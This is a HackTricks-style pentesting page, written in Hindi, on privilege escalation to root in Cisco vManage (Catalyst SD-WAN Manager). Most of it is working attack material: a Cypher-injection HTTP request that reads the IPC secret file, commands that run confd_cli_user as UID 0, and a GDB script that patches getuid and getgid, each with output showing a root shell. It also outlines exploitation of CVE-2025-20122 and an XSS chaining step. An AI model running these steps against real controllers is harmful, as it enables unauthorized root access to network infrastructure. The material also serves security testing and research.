# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

## पथ 1

(उदाहरण [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

`confd` और विभिन्न binaries से संबंधित कुछ [documentation](http://66.218.245.39/doc/html/rn03re18.html) में थोड़ी खोजबीन करने पर (जो Cisco वेबसाइट पर एक खाते से एक्सेस करने योग्य हैं), हमने पाया कि IPC socket को authenticate करने के लिए यह `/etc/confd/confd_ipc_secret` में स्थित एक secret का उपयोग करता है:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
हमारी Neo4j instance याद है? यह `vmanage` उपयोगकर्ता की अनुमतियों के तहत चल रही है, इसलिए हमें पिछली vulnerability का उपयोग करके फ़ाइल प्राप्त करने की अनुमति देती है:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` प्रोग्राम कमांड लाइन आर्गुमेंट्स को सपोर्ट नहीं करता लेकिन आर्गुमेंट्स के साथ `/usr/bin/confd_cli_user` को कॉल करता है। इसलिए हम सीधे `/usr/bin/confd_cli_user` को अपने आर्गुमेंट्स के साथ कॉल कर सकते हैं। हालांकि यह हमारे वर्तमान विशेषाधिकारों से पढ़ने योग्य नहीं है, इसलिए हमें इसे rootfs से निकालकर scp से कॉपी करना होगा, help पढ़कर इसका उपयोग करके shell हासिल करना होगा:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## पथ 2

(उदाहरण: [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

synacktiv टीम का ब्लॉग¹ root shell प्राप्त करने का एक सुंदर तरीका बताता है, लेकिन समस्या यह है कि इसके लिए `/usr/bin/confd_cli_user` की एक कॉपी चाहिए जो केवल root द्वारा पढ़ी जा सकती है। मैंने बिना इस झंझट के root तक पहुँचने का एक और तरीका खोज लिया।

जब मैंने `/usr/bin/confd_cli` बाइनरी को disassemble किया, तो मैंने निम्न देखा:

<details>
<summary>Objdump UID/GID संग्रह दिखा रहा है</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

जब मैं “ps aux” चलाता हूँ, तो मैंने निम्न देखा (_नोट -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
मैंने यह परिकल्पना की कि “confd_cli” प्रोग्राम लॉग-इन उपयोगकर्ता से प्राप्त user ID और group ID को “cmdptywrapper” एप्लिकेशन को पास करता है।

मेरा पहला प्रयास सीधे “cmdptywrapper” को चलाकर उसे `-g 0 -u 0` देना था, लेकिन यह विफल रहा। ऐसा लगता है कि कहीं रास्ते में एक file descriptor (-i 1015) बनाया गया था जिसे मैं नकली नहीं कर सकता।

जैसा कि synacktiv के ब्लॉग (last example) में बताया गया है, `confd_cli` प्रोग्राम command line argument को सपोर्ट नहीं करता, लेकिन मैं इसे एक debugger से प्रभावित कर सकता हूँ और सौभाग्य से सिस्टम पर GDB मौजूद है।

मैंने एक GDB script बनाया जहाँ मैंने API `getuid` और `getgid` को 0 लौटाने के लिए मजबूर किया। चूँकि मेरे पास पहले से deserialization RCE के जरिए “vmanage” privilege है, मुझे सीधे `/etc/confd/confd_ipc_secret` पढ़ने की permission है।

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
कंसोल आउटपुट:

<details>
<summary>कंसोल आउटपुट</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI इनपुट वैलिडेशन बग)

Cisco ने vManage का नाम बदलकर *Catalyst SD-WAN Manager* कर दिया है, लेकिन underlying CLI अभी भी उसी बॉक्स पर चलता है। एक 2025 advisory (CVE-2025-20122) CLI में अपर्याप्त इनपुट वैलिडेशन का वर्णन करती है जो **किसी भी प्रमाणीकृत स्थानीय उपयोगकर्ता** को manager CLI service को crafted request भेजकर root प्राप्त करने देती है। किसी भी low-priv foothold (उदा., Path1 से Neo4j deserialization, या एक cron/backup user shell) को इस खराबी के साथ मिलाकर आप `confd_cli_user` को कॉपी किए बिना या GDB attach किए बिना root पर पहुंच सकते हैं:

1. अपने low-priv shell का उपयोग करके CLI IPC endpoint ढूंढें (आम तौर पर Path2 में पोर्ट 4565 पर दिखने वाला `cmdptywrapper` listener)।
2. ऐसी CLI request तैयार करें जो UID/GID फील्ड्स को 0 में फोर्ज करे। वैलिडेशन बग मूल कॉलर के UID को लागू नहीं करता, इसलिए wrapper एक root-backed PTY लॉन्च करता है।
3. किसी भी कमांड सिक्वेंस (`vshell; id`) को फोर्ज किए गए request के माध्यम से पाइप करके root shell हासिल करें।

> एक्स्प्लॉइट सतह केवल लोकल-ओनली है; प्रारंभिक शेल पाने के लिए अभी भी remote code execution आवश्यक है, लेकिन एक बार बॉक्स के अंदर होने पर exploitation debugger-आधारित UID पैच के बजाय एक single IPC संदेश बन जाता है।

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

* **Authenticated UI XSS (CVE-2024-20475)** – विशिष्ट इंटरफ़ेस फील्ड्स में JavaScript inject करें; एक admin session चुरा लेने से आपको browser-driven path मिलता है जो `vshell` → local shell → Path3 के माध्यम से root तक जाता है।

## References

- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)

{{#include ../../banners/hacktricks-training.md}}
